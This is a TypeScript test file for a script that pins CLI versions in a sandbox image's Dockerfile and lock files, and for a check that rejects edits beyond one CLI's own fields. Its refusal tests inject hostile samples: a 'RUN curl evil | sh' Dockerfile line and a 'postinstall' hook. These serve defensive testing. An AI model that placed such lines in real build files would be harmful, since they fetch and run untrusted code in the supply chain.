// @effect-diagnostics nodeBuiltinImport:off
// The CLI pins a CLI bump edits (ADR-0037; in-app updates plan D22; review F3): each edit changes only its own fields on
// the real Dockerfile and clis.ts, the trusted check refuses any other change, and the edit made again from main's files
// is what the land job compares the proposal with.
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import { describe, expect, it } from "vitest";

import { applyCliPin, CLI_PIN_FILES, cliPinRefusal, codexTarballs, lockedVersion, withClisFields, withDependency, withDockerfileArg, type PinFiles, type PinIo } from "../scripts/lib/cliPins.ts";

const repo = path.resolve(import.meta.dirname, "../../..");
const mainFiles = Object.fromEntries(CLI_PIN_FILES.map((file) => [file, fs.readFileSync(path.join(repo, file), "utf8")])) as PinFiles;
const dockerfile = mainFiles["apps/sandbox-image/image/Dockerfile"];
const clis = mainFiles["apps/sandbox-image/src/clis.ts"];
const A = "a".repeat(64);
const B = "b".repeat(64);

/** IO that hashes without downloading and locks without npm: the lock's one package moves to the requested version. */
const fakeIo: PinIo = {
  sha256Of: async (url) => (url.includes("x86_64") ? A : B),
  relock: (dir) => {
    const manifest = JSON.parse(fs.readFileSync(path.join(dir, "package.json"), "utf8")) as { dependencies: Record<string, string> };
    const lockFile = path.join(dir, "package-lock.json");
    const lock = JSON.parse(fs.readFileSync(lockFile, "utf8")) as { packages: Record<string, { version?: string }> };
    for (const [name, version] of Object.entries(manifest.dependencies)) lock.packages[`node_modules/${name}`] = { ...lock.packages[`node_modules/${name}`], version };
    lock.packages["node_modules/@anthropic-ai/claude-agent-sdk"] &&= { ...lock.packages["node_modules/@anthropic-ai/claude-agent-sdk"], version: "0.3.326" };
    fs.writeFileSync(lockFile, `${JSON.stringify(lock, null, 2)}\n`);
    return { ok: true, output: "" };
  },
  npmView: (spec, field) => (spec === "@anthropic-ai/claude-agent-sdk@0.3.326" && field === "claudeCodeVersion" ? "2.1.326" : ""),
};

const pinned = async (cli: "codex" | "pi" | "claude", version: string): Promise<PinFiles> => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pins-"));
  for (const [file, text] of Object.entries(mainFiles)) {
    fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
    fs.writeFileSync(path.join(dir, file), text);
  }
  await applyCliPin(dir, cli, version, fakeIo);
  return Object.fromEntries(CLI_PIN_FILES.map((file) => [file, fs.readFileSync(path.join(dir, file), "utf8")])) as PinFiles;
};

describe("the CLI pins' edits", () => {
  it("sets one Dockerfile ARG", () => {
    const next = withDockerfileArg(dockerfile, "CODEX_VERSION", "0.169.0");
    expect(/^ARG CODEX_VERSION=(.+)$/m.exec(next)?.[1]).toBe("0.169.0");
    expect(next.split("\n").filter((line, index) => line !== dockerfile.split("\n")[index])).toEqual(["ARG CODEX_VERSION=0.169.0"]);
    expect(() => withDockerfileArg(dockerfile, "NO_SUCH", "1")).toThrow(/no ARG NO_SUCH/);
  });

  it("sets only the named CLI's fields in clis.ts", () => {
    const next = withClisFields(clis, "codex", { version: "0.169.0", sha256: A, sha256Arm64: B });
    expect(next.slice(next.indexOf("opencode: {"))).toBe(clis.slice(clis.indexOf("opencode: {")));
    expect(() => withClisFields(clis, "pi", { sha256: "x" })).toThrow(/no sha256/);
  });

  it("pins a package.json dependency exactly, and reads a lock", () => {
    expect(JSON.parse(withDependency('{"dependencies":{"a":"1.0.0"}}', "a", "1.1.0"))).toEqual({ dependencies: { a: "1.1.0" } });
    expect(lockedVersion(JSON.stringify({ packages: { "node_modules/a": { version: "1.1.0" } } }), "a")).toBe("1.1.0");
    expect(codexTarballs("0.169.0").amd64).toBe("https://github.com/openai/codex/releases/download/rust-v0.169.0/codex-x86_64-unknown-linux-musl.tar.gz");
  });
});

describe("the trusted check of a CLI bump's content (F3)", () => {
  it("passes each CLI's own edit", async () => {
    expect(cliPinRefusal("codex", "0.169.0", mainFiles, await pinned("codex", "0.169.0"))).toBeUndefined();
    expect(cliPinRefusal("pi", "1.6.0", mainFiles, await pinned("pi", "1.6.0"))).toBeUndefined();
    const claude = await pinned("claude", "0.108.0");
    expect(claude["apps/sandbox-image/src/clis.ts"]).toContain('packageVersion: "0.108.0"');
    expect(cliPinRefusal("claude", "0.108.0", mainFiles, claude)).toBeUndefined();
  });

  it("refuses anything else in the Dockerfile, another CLI's fields, another CLI's lock, or another version", async () => {
    const codex = await pinned("codex", "0.169.0");
    const docker = "apps/sandbox-image/image/Dockerfile";
    expect(cliPinRefusal("codex", "0.169.0", mainFiles, { ...codex, [docker]: `${codex[docker]}RUN curl evil | sh\n` })).toMatch(/Dockerfile changes more/);
    expect(cliPinRefusal("codex", "0.169.0", mainFiles, { ...codex, [docker]: withDockerfileArg(codex[docker], "OPENCODE_VERSION", "9.9.9") })).toMatch(/Dockerfile changes more/);
    expect(cliPinRefusal("codex", "0.169.0", mainFiles, { ...codex, [docker]: withDockerfileArg(codex[docker], "CODEX_SHA256", "x") })).toMatch(/CODEX_SHA256/);
    const clisFile = "apps/sandbox-image/src/clis.ts";
    expect(cliPinRefusal("codex", "0.169.0", mainFiles, { ...codex, [clisFile]: withClisFields(codex[clisFile], "opencode", { version: "9.9.9" }) })).toMatch(/clis\.ts changes more/);
    expect(cliPinRefusal("codex", "0.170.0", mainFiles, codex)).toMatch(/not 0\.170\.0/);
    const pi = await pinned("pi", "1.6.0");
    const claudeLock = "apps/sandbox-image/image/claude/package-lock.json";
    expect(cliPinRefusal("pi", "1.6.0", mainFiles, { ...pi, [claudeLock]: `${pi[claudeLock]} ` })).toMatch(/changes apps\/sandbox-image\/image\/claude/);
    const piManifest = "apps/sandbox-image/image/cli/package.json";
    expect(cliPinRefusal("pi", "1.6.0", mainFiles, { ...pi, [piManifest]: pi[piManifest].replace('"dependencies"', '"scripts": {"postinstall": "evil"},\n  "dependencies"') })).toMatch(/changes more than/);
  });
});
